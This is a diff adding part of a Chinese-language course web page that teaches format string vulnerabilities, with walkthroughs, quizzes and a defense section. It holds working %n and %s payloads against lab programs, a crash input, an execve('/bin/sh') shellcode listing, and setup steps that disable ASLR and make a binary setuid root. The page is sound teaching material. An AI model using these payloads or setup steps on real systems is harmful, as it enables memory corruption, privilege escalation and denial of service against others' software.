+            <div class="ctrl-row">
+              <button class="btn ghost sm" id="payCopy">复制 payload</button>
+              <button class="btn ghost sm" id="payExample">填入 0x41414141</button>
+            </div>
+          </div>
+        </div>
+
+        <h3>6.1 现实问题：要写 <code>0x0804a010</code> 怎么办？<span class="h3-en">LARGE VALUE</span></h3>
+        <p>这个数等于 134,520,848。要真输出一亿三千万个字符——不现实。真实 exploit 的做法是拆：</p>
+        <ul>
+          <li>用 <code>%hn</code>（写 2 字节）或 <code>%hhn</code>（写 1 字节），把一个 4 字节值拆成 2～4 次写；</li>
+          <li>每次写的数值变小，输出量可控；</li>
+          <li><strong>n 可以叠加</strong>：第二次写时，已输出数已经包含前面的字符，所以第二个值要用“差值”补到目标值。</li>
+        </ul>
+        <div class="callout warn">
+          <div class="co-head"><span class="ico">!</span>为什么小数值反而写不了？</div>
+          <p>用两次 <code>%hn</code> 写 <code>0x00000041</code> 时，高位是 <code>0x0000</code>。但地址本身已经占掉 8 个字符，输出计数<strong>只增不减</strong>，不可能先写 0 再写 65。遇到这种值，直接用 <code>%n</code> 或换 <code>%hhn</code> 更实际。</p>
+        </div>
+
+        <div class="recap">
+          <span class="rl">RECAP / 06</span>
+          <p><b>写入值由“已输出字符数”决定。</b>地址占 4 字节，宽度补差额；数值太大就拆成 <code>%hn</code> / <code>%hhn</code>，按从小到大写。所有 payload 都以“实际偏移 M”为前提，M 必须探。</p>
+        </div>
+      </div>
+    </section>
+
+    <!-- 07 -->
+    <section class="section" id="s7">
+      <header class="sec-head reveal">
+        <div class="sec-ghost">07</div>
+        <div class="sec-eyebrow"><span class="sec-num">07</span><span class="sec-rule"></span><span class="sec-en">Walkthrough</span></div>
+        <h2>课件上的三道课堂题</h2>
+        <p class="sec-lead">把前面的公式代进去，答案自己会浮出来。先遮住解析自己算一遍，再展开对照。</p>
+      </header>
+
+      <div class="prose">
+        <div class="qa-list">
+          <div class="qa">
+            <button class="qa-q" aria-expanded="false">
+              <span class="qi">Q1</span>
+              <span class="qt"><span class="qa-tag">课堂答题</span>执行 <code>echo -e "\x88\xec\xff\xbf%61c%5$n"</code> 之后，程序里的 secret 输出什么？为什么是 'A'？</span>
+              <span class="qm">+</span>
+            </button>
+            <div class="qa-a"><div class="qa-a-inner"><div class="qa-a-body">
+              <p><code>%61c</code> 让输出宽度变成 61，加上最前面地址 <code>\x88\xec\xff\xbf</code> 占的 4 个字符：</p>
+              <pre>已输出字符数 = 4 + 61 = 65</pre>
+              <p><code>%5$n</code> 把 <strong>65</strong> 写进第 5 个参数（地址 <code>0xbfffec88</code>）指向的内存。写入 4 字节、小端序：</p>
+              <pre>65 00 00 00  →  0x00000041  →  十进制 65  →  ASCII 'A'</pre>
+              <p>所以 secret 那块内存变成了 <code>0x41</code>，按字符串打印出来就是 <strong>"A"</strong>。</p>
+              <p><strong>反过来推：</strong>想写 'A'（65），n = 65 − 4 = <strong>61</strong>。这就是课件给的 <code>%61c</code>。</p>
+            </div></div></div>
+          </div>
+
+          <div class="qa">
+            <button class="qa-q" aria-expanded="false">
+              <span class="qi">Q2</span>
+              <span class="qt"><span class="qa-tag">课堂答题</span>内存里是 <code>1111</code>，要改成 <code>11A1</code>，<code>%[n]c</code> 里的 n 取多少？</span>
+              <span class="qm">+</span>
+            </button>
+            <div class="qa-a"><div class="qa-a-inner"><div class="qa-a-body">
+              <p>"1111" 四个字节的 ASCII 是 <code>31 31 31 31</code>；"11A1" 是 <code>31 31 41 31</code>。</p>
+              <p>用 <code>%n</code> 一次写 4 字节，得把这 4 字节<strong>整体</strong>当一个小端 32 位整数看：</p>
+              <pre>内存字节（低→高）:  31  31  41  31
+写成 dword        : 0x31413131
+                  = 3×16⁷ + 1×16⁶ + 4×16⁵ + 1×16⁴ + 3×16³ + 1×16² + 3×16¹ + 1
+                  = 826356017</pre>
+              <p>再减去地址本身占掉的 4 个字符：</p>
+              <pre>n = 826356017 − 4 = 826356013</pre>
+              <p>所以 payload 是 <code>echo -e "\x88\xec\xff\xbf%826356013c%5$n"</code>。</p>
+              <div class="callout warn" style="margin:10px 0 0">
+                <p><strong>两个提醒：</strong>① 课件上的 826356013 是<strong>已经减过 4 的 n</strong>，按展开式严格算 dword 值是 <strong>826356017</strong>——注意区分“要写的值”和“n”。② 现实中这么大的 n 会输出 8 亿多个字符，不可行；实战用 <code>%hhn</code> 逐字节写，每次最多 255。</p>
+              </div>
+            </div></div></div>
+          </div>
+
+          <div class="qa">
+            <button class="qa-q" aria-expanded="false">
+              <span class="qi">Q3</span>
+              <span class="qt"><span class="qa-tag">课堂遗留</span><code>echo "%c" | ./qiang</code> 为什么会输出一个 "d"？</span>
+              <span class="qm">+</span>
+            </button>
+            <div class="qa-a"><div class="qa-a-inner"><div class="qa-a-body">
+              <p>程序里只有 <code>%c</code> 和 <code>%n</code> 会被格式化处理；<code>%n</code> 不产生输出，所以屏幕上那个字符<strong>只能是 <code>%c</code> 干的</strong>。</p>
+              <p><code>%c</code> 的行为：从参数指针位置取 4 字节整数，<strong>只把最低那个字节当 ASCII 码输出</strong>。那 4 字节里恰好是残留数据 <code>0x64</code>：</p>
+              <pre>0x64 = 100 = ASCII 'd'</pre>
+              <p>课件栈图上标的位置 <code>0x64</code> 就是这个残留值（前面跑 <code>echo "AAAA1=%p|2=%p…"</code> 时在栈上留下的痕迹）。<strong>printf 不会检查参数是不是垃圾——给它什么，它就打什么。</strong></p>
+            </div></div></div>
+          </div>
+        </div>
+
+        <div class="recap">
+          <span class="rl">RECAP / 07</span>
+          <p><b>三道题共用一套算术：</b>已输出字符数 = 地址字节 + 补宽；写入值 = 已输出字符数；n 是补宽，不是最终值。把“值”和“n”分清，就不会在考试和实战里写反。</p>
+        </div>
+      </div>
+    </section>
+
+    <!-- 08 -->
+    <section class="section" id="s8">
+      <header class="sec-head reveal">
+        <div class="sec-ghost">08</div>
+        <div class="sec-eyebrow"><span class="sec-num">08</span><span class="sec-rule"></span><span class="sec-en">Denial of Service</span></div>
+        <h2>最省事的攻击：让它崩</h2>
+        <p class="sec-lead">不需要布局、不需要地址、不需要 payload——一串 <code>%s</code> 就够。这也是为什么格式化字符串漏洞被归类为“高危”：最低成本就能让服务不可用。</p>
+      </header>
+
+      <div class="prose">
+        <script type="text/plain" class="code-src" data-lang="c" data-file="dos.c" data-lines="1">
+int func(char *user) {
+    fprintf(stdout, user);   /* user = "%s%s%s%s%s%s%s" */
+}</script>
+
+        <p>如果 <code>user = "%s%s%s%s%s%s%s"</code>：</p>
+        <ol>
+          <li>每个 <code>%s</code> 都从栈上取 4 字节<strong>当地址</strong>；</li>
+          <li>栈上大部分值<strong>不是合法的可读地址</strong>（可能是整数、返回地址、随机的栈垃圾）；</li>
+          <li>printf 去访问这些地址 → <strong>SIGSEGV，进程崩溃</strong>。</li>
+        </ol>
+
+        <div class="term-out">
+          <div class="win-bar"><span class="win-dots"><i></i><i></i><i></i></span><span class="win-file">crash</span><span class="win-lang">OUTPUT</span></div>
+          <pre><span class="t-p">$</span> echo "%s%s%s%s%s%s%s" | ./log_client
+[LOG] <span class="t-warn">0xbfffec10</span>...
+<span class="t-bad">Segmentation fault (core dumped)</span>
+<span class="t-dim"># 一个输入，零个地址，进程直接退出</span></pre>
+        </div>
+
+        <div class="callout fix">
+          <div class="co-head"><span class="ico">✓</span>修复</div>
+          <p><code>fprintf(stdout, "%s", user);</code>——让用户输入永远当“数据”，不当“格式”。所有格式化函数都适用同一原则。</p>
+        </div>
+
+        <div class="callout warn">
+          <div class="co-head"><span class="ico">!</span>注意边界</div>
+          <p>并非每个 <code>%s</code> 都会立刻崩溃：如果取到的值恰好是一个合法可读地址，它可能读出一段很长甚至没有 <code>\0</code> 的数据。但只要继续取，落入非法地址只是时间问题。<strong>不要用“还没崩”来判断输入无害。</strong></p>
+          <p>这类测试只应在<strong>授权实验环境</strong>进行。对真实服务发送类似输入属于攻击行为。</p>
+        </div>
+
+        <div class="recap">
+          <span class="rl">RECAP / 05–08</span>
+          <p><b>读：<code>%s</code> 把栈值当地址；写：<code>%n</code> 把计数当地址写进去；数值：用宽度控制计数。</b>三者共用“地址进格式串 + 偏移 M”的骨架。最低成本的 DoS，则只需要几个 <code>%s</code>。</p>
+        </div>
+      </div>
+    </section>
+
+    <!-- 09 -->
+    <section class="section" id="s9">
+      <header class="sec-head reveal">
+        <div class="sec-ghost">09</div>
+        <div class="sec-eyebrow"><span class="sec-num">09</span><span class="sec-rule"></span><span class="sec-en">Chain Reaction</span></div>
+        <h2>进阶：用格式化字符串制造溢出</h2>
+        <p class="sec-lead">格式化字符串不只可以读写内存，它还能<strong>凭空生成输出</strong>。当程序把“限长后的字符串”再次当作格式串，长度检查就形同虚设。</p>
+      </header>
+
+      <div class="prose">
+        <p>这是 <strong>QPOP 2.53 / bftpd</strong> 的真实漏洞模式，课件重点讲了。看这段代码：</p>
+
+        <script type="text/plain" class="code-src" data-lang="c" data-file="qpop.c" data-lines="1">
+char outbuf[512], errmsg[512];
+
+sprintf(errmsg, "Err Wrong command: %400s", user);
+/* ① 看起来安全：%400s 把 user 限制在 400 字符 */
+
+sprintf(outbuf, errmsg);
+/* ② 致命：errmsg 被当成了格式字符串 */</script>
+
+        <div class="callout warn">
+          <div class="co-head"><span class="ico">!</span>两层陷阱</div>
+          <p>① 里 <code>%400s</code> 确实把 user 截到 400 字符，加上前缀 19 字符 = 419，塞进 512 的 errmsg 没问题。</p>
+          <p>但 ② 把 <strong>errmsg 当成了格式字符串</strong>！于是 user 里的 <code>%</code> 又活了过来 → 变成了<strong>格式化字符串漏洞</strong>。第二层 <code>sprintf</code> 没有长度限制，也没有把 errmsg 当数据。</p>
+        </div>
+
+        <h3>9.1 算一下怎么溢出<span class="h3-en">THE MATH</span></h3>
+        <script type="text/plain" class="code-src" data-lang="c" data-file="qpop-payload.c" data-lines="1">
+user = "%497d\x3c\xd3\xff\xbf<nops><shellcode>";</script>
+
+        <div class="sketch"><span class="c">errmsg =</span> "Err Wrong command: " (19)  +  <span class="am">%497d 展开的 497 个字符</span>
+<span class="c">       =</span> 19 + 497 = <b>516</b> 个字符（再补结尾 \0）
+
+<span class="c">写进</span> outbuf[512]：
+|&lt;---------------- 512 字节缓冲区 ---------------->|
+|<span class="c"> 19 前缀 </span>|<span class="am"> 497 个填充字符 </span>|<span class="r"> 后面还有地址/NOP/shellcode </span>...→
+                                             ↑
+                                     <span class="r">越过边界，覆盖保存的 ebp / 返回地址</span></div>
+
+        <p>课件用“516 = 512 + 4”做最小示意：仅前缀和 <code>%497d</code> 的展开就已经越过 4 字节，再加上结尾的 <code>\0</code> 和后面的地址 / NOP / shellcode，实际越界更多。关键是：<strong>程序员限制的是输入长度，攻击者控制的是展开后的输出长度。</strong></p>
+
+        <p>越界之后，payload 里的返回地址指向 NOP 雪橇，CPU 一路滑到 shellcode，变成一次<strong>普通栈溢出攻击</strong>。</p>
+
+        <div class="callout note">
+          <div class="co-head"><span class="ico">i</span>NOP 雪橇的作用</div>
+          <p>恶意代码的地址不可能 100% 算准。用一大片 <code>0x90</code>（NOP）铺在 shellcode 前面，只要返回地址<strong>落在这一片 NOP 中的任意位置</strong>，CPU 就会一路“滑行”到真正的 shellcode，<strong>大幅提高命中率</strong>。</p>
+        </div>
+
+        <div class="lab reveal" id="sledLab">
+          <div class="lab-head">
+            <span class="lab-title">LAB 06 / NOP SLED</span>
+            <span class="lab-sub">随机投掷一个返回地址，看它落在雪橇上会怎样</span>
+            <span class="lab-live"><i></i>INTERACTIVE</span>
+          </div>
+          <div class="lab-body">
+            <div class="task"><b>观察任务</b><span>为什么不需要精确跳到 shellcode 的第一个字节？点几次“投掷”，看落点与滑行路径。</span></div>
+            <div class="sled-wrap">
+              <div class="sled" id="sledCells"></div>
+              <div class="sled-read" id="sledText">点击按钮，随机投掷一个返回地址。绿色格子是 NOP，红色格子是 shellcode。</div>
+              <div class="ctrl-row">
+                <button class="btn sm" id="sledBtn">投掷返回地址</button>
+                <button class="btn ghost sm" id="sledReset">重置</button>
+              </div>
+            </div>
+            <p class="note"><b>现实边界：</b>DEP / NX 会让栈不可执行，NOP 雪橇也救不了；这时攻击者会转向 ROP。雪橇解决的是“地址猜不准”，不解决“栈不能执行”。</p>
+          </div>
+        </div>
+
+        <div class="callout tip">
+          <div class="co-head"><span class="ico">→</span>这一节最值得记住的</div>
+          <p>格式化字符串的“宽度”本质上是在<strong>凭空生成输出</strong>。程序员以为限定了输入长度，其实输出长度被攻击者接管了。审查时不要只看 <code>scanf</code> / <code>fgets</code> 的限制，要看<strong>数据最后流向了哪里</strong>。</p>
+        </div>
+
+        <div class="recap">
+          <span class="rl">RECAP / 09</span>
+          <p><b>限长不等于安全。</b>把“受限输入”再次当格式串，<code>%497d</code> 就能把输出撑过缓冲区，制造二次溢出。格式化字符串是“放大器”，把小的输入变成大的破坏面。</p>
+        </div>
+      </div>
+    </section>
+
+    <!-- 10 -->
+    <section class="section" id="s10">
+      <header class="sec-head reveal">
+        <div class="sec-ghost">10</div>
+        <div class="sec-eyebrow"><span class="sec-num">10</span><span class="sec-rule"></span><span class="sec-en">Defense</span></div>
+        <h2>防御：把格式串钉死</h2>
+        <p class="sec-lead">修复只需要一行。Canary、ASLR、DEP 是纵深防御——它们提高利用门槛，但都不能替代“不要拿用户输入当格式串”。</p>
+      </header>
+
+      <div class="prose">
+        <div class="def-grid">
+          <div class="def acid">
+            <div class="df">ROOT FIX / 根治</div>
+            <h4>格式串必须是常量</h4>
+            <p><code>printf("%s", user)</code>，或 <code>fputs(user, stdout)</code>。所有可变内容都走参数。</p>
+            <div class="bypass"><b>绕过：</b>没有。这是从根上消除漏洞，优先级最高。</div>
+          </div>
+          <div class="def cyan">
+            <div class="df">RUNTIME / 检测</div>
+            <h4>Canary（栈金丝雀）</h4>
+            <p>在返回地址前放一个随机值，函数返回前检查它有没有被改。挡住“覆盖返回地址”的栈溢出。</p>
+            <div class="bypass"><b>绕过：</b>先用格式化串<strong>读出</strong> canary，溢出时再原样写回。canary 每次运行随机，难度会陡增。</div>
+          </div>
+          <div class="def amber">
+            <div class="df">RUNTIME / 随机化</div>
+            <h4>ASLR（地址空间随机化）</h4>
+            <p>让栈、共享库、堆的地址每次运行都变，硬编码地址失效。</p>
+            <div class="bypass"><b>绕过：</b>先 dump 内存泄露基址（例如 libc 基址）再算；但地址下次运行会变，payload 需要重新计算。<br>课件等级：0 关 / 1 栈与共享库随机（堆不变）/ 2 堆也随机。</div>
+          </div>
+          <div class="def red">
+            <div class="df">RUNTIME / 阻止执行</div>
+            <h4>DEP / NX</h4>
+            <p>把栈标记为不可执行，阻止“在栈上执行 shellcode”。</p>
+            <div class="bypass"><b>绕过：</b>改走 ROP——用程序已有的代码片段（gadget）拼出执行链，不往栈上写新代码。</div>
+          </div>
+        </div>
+
+        <h3>10.1 编译期也能帮忙<span class="h3-en">COMPILER</span></h3>
+        <div class="term-out">
+          <div class="win-bar"><span class="win-dots"><i></i><i></i><i></i></span><span class="win-file">build</span><span class="win-lang">BASH</span></div>
+          <pre><span class="t-p">$</span> gcc -Wformat -Wformat-security -D_FORTIFY_SOURCE=2 \
+      -Werror=format-security -O2 prog.c -o prog</pre>
+        </div>
+        <p>这组选项会对 <code>printf(user)</code> 这类“非字面量格式串”直接报警告；<code>-Werror=format-security</code> 把警告升级为编译错误。它抓不到所有逻辑问题，但能拦住这个最典型的错误。</p>
+
+        <div class="callout warn">
+          <div class="co-head"><span class="ico">!</span>别把缓解当修复</div>
+          <p><code>snprintf</code> 只解决“写越界”，不解决“格式串被用户控制”。<code>Canary</code> 只保护返回地址，不保护被你用 <code>%n</code> 改掉的普通变量。每种机制都只挡一个面，正确写法才是根治。</p>
+        </div>
+
+        <div class="recap">
+          <span class="rl">RECAP / 10</span>
+          <p><b>优先级：正确写法 &gt; 编译期检查 &gt; 运行期缓解。</b>Canary / ASLR / DEP 能提高门槛，但都可以被“先泄露，再绕过”的思路逐个拆掉，所以要叠加使用。</p>
+        </div>
+      </div>
+    </section>
+
+    <!-- 11 -->
+    <section class="section" id="s11">
+      <header class="sec-head reveal">
+        <div class="sec-ghost">11</div>
+        <div class="sec-eyebrow"><span class="sec-num">11</span><span class="sec-rule"></span><span class="sec-en">Related Bugs</span></div>
+        <h2>顺带：溢出家族</h2>
+        <p class="sec-lead">格式化字符串不是孤立的漏洞，它属于“越界写”这个大家族。理解四个近亲，能帮你在不同题型里快速定位攻击面。</p>
+      </header>
+
+      <div class="prose">
+        <div class="grid2">
+          <div class="card red">
+            <span class="tag">STACK OVERFLOW</span>
+            <h4>栈溢出（实验环境）</h4>
+            <p>为了能复现，要先把保护关掉：</p>
+            <div class="sketch" style="margin:9px 0;font-size:10.5px">gcc -fno-stack-protector -z execstack -g -o stack stack.c
+sudo sysctl -w kernel.randomize_va_space=0
+sudo chown root stack &amp;&amp; sudo chmod 4755 stack  <span class="c"># chown 会清 suid</span></div>
+            <p><b>Task A：</b>gdb 找 buf 地址和 ebp。课件实测差 108，返回地址在 <code>ebp+4</code> → <b>偏移 112</b>。<br><b>Task B：</b>关掉 ASLR 后栈起始固定，猜 shellcode 地址，用 NOP 雪橇兜底。</p>
+          </div>
+          <div class="card amber">
+            <span class="tag">SHELLCODE</span>
+            <h4>Shellcode 要干什么</h4>
+            <p>目标：<code>execve("/bin/sh", argv, 0)</code>，拿一个 shell。</p>
+            <p><b>两条硬约束：</b>① 机器码里不能含 <code>\x00</code>，否则会被 <code>strcpy</code> 截断；② 用 <code>//sh</code> 补到 4 字节对齐。</p>
+            <p>所以用 <code>xor eax,eax</code> 而不是 <code>mov eax,0</code>；用 <code>push "/bin//sh"</code> 构造字符串。</p>
+          </div>
+          <div class="card cyan">
+            <span class="tag">HEAP OVERFLOW</span>
+            <h4>堆溢出</h4>
+            <p>两个相邻的 <code>malloc</code> 块，buf1 写穿会踩到 buf2 的数据，或者踩到堆块管理头（fd / bk 指针）。</p>
+            <div class="sketch" style="margin:9px 0;font-size:10.5px">char *buf1 = malloc(16);
+char *buf2 = malloc(16);
+while ((*(buf1+i) = getchar()) != EOF) i++;  <span class="c">// 无边界</span></div>
+            <p>目标是“敏感数据”而非返回地址；踩管理头可劫持 <code>unlink</code> 实现任意写。</p>
+          </div>
+          <div class="card acid">
+            <span class="tag">BSS OVERFLOW</span>
+            <h4>BSS 溢出</h4>
+            <p><code>static</code> 变量放在 BSS 段，<b>不在栈上</b>，所以 Canary 管不着。</p>
+            <p>两种打法：覆盖 <code>static char *tmpfile</code> → 程序去写攻击者指定的文件（如 <code>/etc/passwd</code>）；覆盖 <code>static int (*funcptr)(const char*)</code> → 劫持函数指针，直接控制执行流。</p>
+          </div>
+        </div>
+
+        <h3>11.1 shellcode 逐条拆解<span class="h3-en">SHELLCODE</span></h3>
+        <script type="text/plain" class="code-src" data-lang="asm" data-file="shellcode.s" data-lines="1">
+31 c0              xor    eax,eax        ; eax = 0
+50                 push   eax            ; 字符串结尾 \0
+68 2f 2f 73 68     push   "//sh"
+68 2f 62 69 6e     push   "/bin"
+89 e3              mov    ebx,esp        ; ebx → "/bin//sh"
+50                 push   eax            ; argv[1] = NULL
+53                 push   ebx            ; argv[0]
+89 e1              mov    ecx,esp        ; ecx → argv
+99                 cdq                   ; edx = 0  (envp = NULL)
+b0 0b              mov    al,0x0b        ; execve 系统调用号 = 11
+cd 80              int    0x80           ; 发起系统调用</script>
+
+        <p>这段是 32 位 Linux 的 <code>int 0x80</code> ABI：系统调用号放 <code>eax</code>，参数放 <code>ebx / ecx / edx</code>。64 位下调用号和寄存器不同（例如 <code>execve</code> = 59，使用 <code>syscall</code>），不要混用。</p>
+
+        <div class="callout note">
+          <div class="co-head"><span class="ico">i</span>共同点</div>
+          <p>栈、堆、BSS、格式化字符串，最终都在做同一件事：<strong>写到不该写的地方</strong>。区别只是“写什么、写到哪里、由谁触发”。格式化字符串的特殊之处是：它既能读，又能写，还能用宽度凭空放大输出。</p>
+        </div>
+
+        <div class="recap">
+          <span class="rl">RECAP / 11</span>
+          <p><b>溢出家族的共同问题是缺少边界。</b>栈溢出改返回地址，堆溢出改管理结构，BSS 溢出改静态指针 / 函数指针；格式化字符串则用 <code>%n</code> 直接写任意地址。</p>
+        </div>
+      </div>
+    </section>
+
+    <!-- 12 -->
+    <section class="section" id="s12">
+      <header class="sec-head reveal">
+        <div class="sec-ghost">12</div>
+        <div class="sec-eyebrow"><span class="sec-num">12</span><span class="sec-rule"></span><span class="sec-en">Field Notes</span></div>
+        <h2>课程代码实战</h2>
+        <p class="sec-lead">纸上的地址要变成真的内存，必须自己跑一遍。下面按“准备环境 → 探偏移 → 读写 → 进阶”的顺序走，所有命令都对应课件里的 <code>codes-share-to-class</code>。</p>
+      </header>
+
+      <div class="prose">
+        <h3>12.1 先准备环境（每个实验都要）<span class="h3-en">SETUP</span></h3>
+        <div class="term-out">
+          <div class="win-bar"><span class="win-dots"><i></i><i></i><i></i></span><span class="win-file">setup</span><span class="win-lang">BASH</span></div>
+          <pre><span class="t-p">$</span> sudo sysctl -w kernel.randomize_va_space=0   <span class="t-dim"># 关 ASLR，地址才固定</span>
+<span class="t-p">$</span> gcc -m32 -fno-stack-protector -z execstack -g -o qiang qiang.c</pre>
+        </div>
+        <div class="callout warn">
+          <div class="co-head"><span class="ico">!</span>只在隔离环境做</div>
+          <p>关闭 ASLR 是系统级操作，会影响整台机器。请只在自己的虚拟机 / 实验环境执行，不要在生产或共享机器上关闭它。</p>
+        </div>
+
+        <h3>12.2 代码地图<span class="h3-en">FILE MAP</span></h3>
+        <div class="table-wrap">
+          <table>
+            <thead><tr><th>文件</th><th>干什么</th><th>对应课件</th></tr></thead>
+            <tbody>
+              <tr><td><code>formattingString/write.c</code></td><td><code>%n</code> 一次写 4 字节，踩坏 canary</td><td>“%n” / foo:10204080</td></tr>
+              <tr><td><code>formattingString/dumpStack.c</code></td><td>一串 <code>%08x</code> 把栈倒出来</td><td>查看栈中数据</td></tr>
+              <tr><td><code>formattingString/test.c</code></td><td><code>\x1f\x01\xff\xbf_%08x.%08x|%s|</code> 任意读</td><td>任意读</td></tr>
+              <tr><td><code>formattingString/qiang.c</code></td><td><strong>主实验</strong>：任意读 + 任意写 secret</td><td>课堂答题 1 / 2</td></tr>
+              <tr><td><code>formattingString/str_fmt_attack.c</code></td><td>真实的“密码错误回显”漏洞</td><td>内存数据窃取与篡改</td></tr>
+              <tr><td><code>formattingString/int_fmt_attack.c</code></td><td>改 <code>unsigned int</code> 型 secret</td><td>printf("Modify the memory: %n")</td></tr>
+              <tr><td><code>formattingString/savedparameters.c</code></td><td>gdb 看 printf 参数在栈上的位置</td><td>补充讲解 / 四个 push</td></tr>
+              <tr><td><code>bufferoverflow/stack.c</code> + <code>stack_exploit.py</code></td><td>标准栈溢出拿 shell</td><td>Buffer Overflow 举例</td></tr>
+              <tr><td><code>bufferoverflow/shellcode.c</code></td><td>execve("/bin/sh") 的机器码</td><td>Shellcode 举例</td></tr>
+            </tbody>
+          </table>
+        </div>
+
+        <h3>12.3 主实验 <code>qiang.c</code>：先看漏洞形状<span class="h3-en">TARGET</span></h3>
+        <script type="text/plain" class="code-src" data-lang="c" data-file="qiang.c" data-lines="1">
+char buf[100];
+char secret[100] = "111122223333";
+
+printf("address of secret is at %p\n", secret);  /* ① 把 secret 地址告诉你 */
+fgets(buf, sizeof(buf), stdin);
+printf(buf);                                    /* ② 漏洞点：用户输入当格式串 */</script>
+
+        <div class="callout warn">
+          <div class="co-head"><span class="ico">!</span><code>%5$</code> 里的 5 是哪来的？</div>
+          <p><strong>不是算出来的，是试出来的。</strong>printf 的参数区紧挨着 main 的栈帧，你的 <code>buf</code> 落在第几个参数位置，取决于编译器、代码、栈布局——换台机器可能就变了。标准手法是先用 <code>AAAA</code> 打标：</p>
+          <pre>echo -e "\x41\x41\x41\x41%p|%p|%p|%p|%p|%p|%p|%p" | ./qiang
+# 看哪一格输出 0x41414141 —— 假设是第 5 个 → 以后就用 %5$</pre>
+        </div>
+
+        <h3>12.4 五步走查：从地址到任意写<span class="h3-en">WALKTHROUGH</span></h3>
+        <div class="steps">
+          <div class="step">
+            <div class="step-head"><span class="step-no">STEP 0</span><span class="step-title">拿到 secret 地址</span></div>
+            <p>运行程序，它会先打印 <code>address of secret is at 0xbfffec88</code>。下面用这个地址举例；你的环境很可能不同，必须以程序输出为准。</p>
+          </div>
+          <div class="step">
+            <div class="step-head"><span class="step-no">STEP 1</span><span class="step-title">确认能控制参数</span></div>
+            <pre class="sketch" style="margin:6px 0 0">echo -e "\x88\xec\xff\xbf%5$p" | ./qiang</pre>
+            <p>如果输出 <code>0xbfffec88</code>，说明你塞进去的地址被原样打印了——参数指针能走到你放地址的那一格。</p>
+          </div>
+          <div class="step">
+            <div class="step-head"><span class="step-no">STEP 2</span><span class="step-title">任意读</span></div>
+            <pre class="sketch" style="margin:6px 0 0">echo -e "\x88\xec\xff\xbf%5$s" | ./qiang</pre>
+            <p>把地址处的内容当字符串打印 → 读出 <code>111122223333</code>。<strong>读和写只差一个字母。</strong></p>
+          </div>
+          <div class="step">
+            <div class="step-head"><span class="step-no">STEP 3</span><span class="step-title">任意写（写 4）</span></div>
+            <pre class="sketch" style="margin:6px 0 0">echo -e "\x88\xec\xff\xbf%5$n" | ./qiang</pre>
+            <p>地址本身占 4 个字符 → 写入 <b>4</b>。secret 前 4 字节变成 <code>04 00 00 00</code>。</p>
+          </div>
+          <div class="step">
+            <div class="step-head"><span class="step-no">STEP 4</span><span class="step-title">写指定值（'A' = 65）</span></div>
+            <pre class="sketch" style="margin:6px 0 0">echo -e "\x88\xec\xff\xbf%61c%5$n" | ./qiang</pre>
+            <p>4 + 61 = 65 → 写入 <code>0x00000041</code> → secret 变成 <code>A111223333</code>。</p>
+          </div>
+          <div class="step">
+            <div class="step-head"><span class="step-no">STEP 5</span><span class="step-title">把 "1111" 改成 "11A1"</span></div>
+            <pre class="sketch" style="margin:6px 0 0">echo -e "\x88\xec\xff\xbf%826356013c%5$n" | ./qiang</pre>
+            <p>"1111" = <code>31 31 31 31</code>；"11A1" = <code>31 31 41 31</code> → 小端 dword = <code>0x31413131</code> = <b>826356017</b>；减去地址占的 4 → <b>n = 826356013</b>。</p>
+            <p class="note">这条命令会真的输出 8 亿多个字符，课件用它讲数值换算即可，别在实验里等它跑完。真实利用会用 <code>%hhn</code> 分字节写。</p>
+          </div>
+        </div>
+
+        <h3>12.5 <code>str_fmt_attack.c</code>：一个容易踩的坑<span class="h3-en">PREFIX TRAP</span></h3>
+        <script type="text/plain" class="code-src" data-lang="c" data-file="str_fmt_attack.c" data-lines="1">
+void handle_failure(char *buf) {
+    char msg[100];
+    snprintf(msg, sizeof(msg), "Invalid Password!!! %s\n", buf);
+    printf(msg);        /* ← 漏洞在这 */
+}</script>
+
+        <div class="callout danger">
+          <div class="co-head"><span class="ico">!</span>前缀被算进去了吗？</div>
+          <p>你的 payload 前面被自动加了 <code>"Invalid Password!!! "</code> 共 <b>20 个字符</b>。所以 <code>%n</code> 写入的值 = <b>20 + 4（地址）+ n</b>，而不是 <code>4 + n</code>。算 payload 时必须把前缀算进去。</p>
+          <pre>echo 'AAAA%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p' | ./str_fmt_attack   # 先探测偏移
+echo $(printf "\x38\xa0\x04\x08")%12$n        | ./str_fmt_attack  # 写入 20 + 4   = 24
+echo $(printf "\x38\xa0\x04\x08")%10c%12$n   | ./str_fmt_attack  # 写入 20 + 4 + 10 = 34</pre>
+          <p>这里偏移是 <code>%12$</code> 不是 <code>%5$</code>——再次说明<strong>偏移量一定要自己探</strong>。用 <code>echo $(printf ...)</code> 而不是 <code>echo -e</code>，是因为不同 shell 的 <code>-e</code> 行为不一致。</p>
+        </div>
+
+        <div class="callout tip">
+          <div class="co-head"><span class="ico">✓</span>实验检查清单</div>
+          <p>① ASLR 关了吗？② 地址是本次运行打印/确认的吗？③ 偏移 M 是用 <code>AAAA</code> 探的吗？④ 有没有把程序自动加的前缀算进已输出字符数？⑤ payload 地址字节是小端序吗？</p>
+        </div>
+
+        <div class="recap">
+          <span class="rl">RECAP / 12</span>
+          <p><b>实战的难点不是公式，而是“现场”：</b>地址每次运行可能变、偏移因编译器和栈布局而异、程序可能偷偷加前缀。所有 payload 都要用当前进程的真实地址和实测偏移来算。</p>
+        </div>
+      </div>
+    </section>
+
+    <!-- 13 -->
+    <section class="section" id="s13">
+      <header class="sec-head reveal">
+        <div class="sec-ghost">13</div>
+        <div class="sec-eyebrow"><span class="sec-num">13</span><span class="sec-rule"></span><span class="sec-en">Self Test</span></div>
+        <h2>8 道题，检验一下</h2>
+        <p class="sec-lead">不要求背地址，只要求你能从现象推出下一步。先在心里答，再展开对照；能讲清楚“为什么”，比记住答案更重要。</p>
+      </header>
+
+      <div class="prose">
+        <div class="qa-tools">
+          <button class="btn ghost xs" id="quizAllOpen">全部展开</button>
+          <button class="btn ghost xs" id="quizAllClose">全部收起</button>
+          <span class="qa-count" id="quizCount">0 / 8 已展开</span>
+        </div>
+        <div class="qa-list" id="selfQuiz">
+          <div class="qa">
+            <button class="qa-q" aria-expanded="false"><span class="qi">01</span><span class="qt"><code>printf("%2$d", 10, 20, 30)</code> 输出什么？</span><span class="qm">+</span></button>
+            <div class="qa-a"><div class="qa-a-inner"><div class="qa-a-body"><p>输出 <code>20</code>。<code>%2$d</code> 是位置参数，直接取第 2 个参数，跳过第一个。它不改变“从栈上取值”的本质，只是把取第几格写死了。</p></div></div></div>
+          </div>
+          <div class="qa">
+            <button class="qa-q" aria-expanded="false"><span class="qi">02</span><span class="qt">为什么 <code>printf("%s%s%s%s")</code> 很可能崩？</span><span class="qm">+</span></button>
